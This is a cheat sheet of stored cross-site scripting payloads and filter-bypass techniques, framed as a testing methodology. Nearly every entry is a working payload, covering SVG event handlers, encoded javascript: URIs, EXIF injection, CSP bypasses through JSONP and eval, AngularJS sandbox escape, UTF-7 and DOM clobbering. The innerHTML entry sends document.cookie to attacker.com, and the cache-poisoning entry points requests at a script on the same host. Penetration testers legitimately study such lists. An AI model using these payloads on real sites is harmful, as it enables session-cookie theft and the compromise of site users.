SVG Event Handlers
Description: Use SVG elements with event handlers like onload or onmouseover, often allowed by sanitizers.
Payload:
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
<circle cx="50" cy="50" r="40" fill="red"/>
</svg>

Colon Replacement
Description: Bypass javascript: filters using HTML entities (:) or encoded tabs ( ).
Payload:
<a href="java&Tab;script&colon;alert(1)">Click Me</a>

Alternative Event Triggers
Description: Use newer events like onauxclick (right-click) instead of blocked ones.
Payload:
<img src=x onauxclick="alert('Right-click me!')">

File Upload Exploits
Description: Inject XSS into file uploads (e.g., EXIF metadata in images or embedded JS in PDFs).
Example (EXIF XSS):
exiftool -Comment='"><svg/onload=alert(1)>' image.jpg
Rendered Output:

<!-- App displays EXIF unsanitized -->
<img src="image.jpg" alt="Image Comment: "><svg/onload=alert(1)>">

DOM innerHTML Sinks
Description: Exploit unsanitized innerHTML assignments in JavaScript.
Payload:
<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">

Template Literal Injection
Description: Abuse JavaScript template strings in dynamic code.
Payload:
// Server code: var bio = ${userInput};
${alert(document.domain)}

CSP Bypass via JSONP
Description: Use unvalidated JSONP endpoints to execute scripts.
Payload:

<script src="/api/data?callback=alert(1);//"></script>
Unsafe-eval Exploitation
Description: Bypass CSP with setTimeout(eval, ...) or similar.
Payload:

<script> setTimeout(eval, 100, "alert('CSP Bypassed')"); </script>
Header/Log XSS
Description: Inject payloads into headers (e.g., User-Agent, X-Forwarded-For) stored in logs.
Payload:
curl -H "User-Agent: <img src=x onerror=alert(1)>" https://example.com

AngularJS Sandbox Escape
Description: Abuse AngularJS sandbox to execute arbitrary JavaScript.
Payload:

<div ng-app>{{x.constructor.constructor('alert(1)')()}}</div>
Username Field XSS
Description: Store payloads in HTML-enabled username fields.
Payload:
<img src=x onerror="alert('Stored in username!')">

Cache Poisoning
Description: Manipulate CDN caches to serve malicious content.
Payload:

<script> fetch('/home', {headers: {'X-Forwarded-Host': 'attacker.com/xss.js'}}); </script>
UTF-7 Exploitation
Description: Use UTF-7 encoding if the charset is misconfigured.
Payload:
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

Data URI Bypass
Description: Execute scripts via data: URIs in iframe or object.
Payload:
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

Mutation Bypass
Description: Use payloads that correct after WAF parsing.
Payload:

<div><svg/onload=alert(1)></div> <!-- Fixes to <svg onload=... during parsing -->
Server-Client Parsing Gaps
Description: Exploit differences in HTML parsing between server and client.
Payload:

<!--</style></script><script>alert(1)</script>-->
DOM Clobbering
Description: Overwrite JavaScript variables using DOM elements.
Payload:

<form id="config"><input name="url" value="javascript:alert(1)"> <!-- Exploits: window.config.url -->
Dynamic JS Execution
Description: Inject into unsanitized eval() inputs.
Payload:
// Vulnerable code: eval("var userInput = '" + userData + "';");
';alert(1);//

This list provides a comprehensive methodology for testing Stored XSS vulnerabilities.
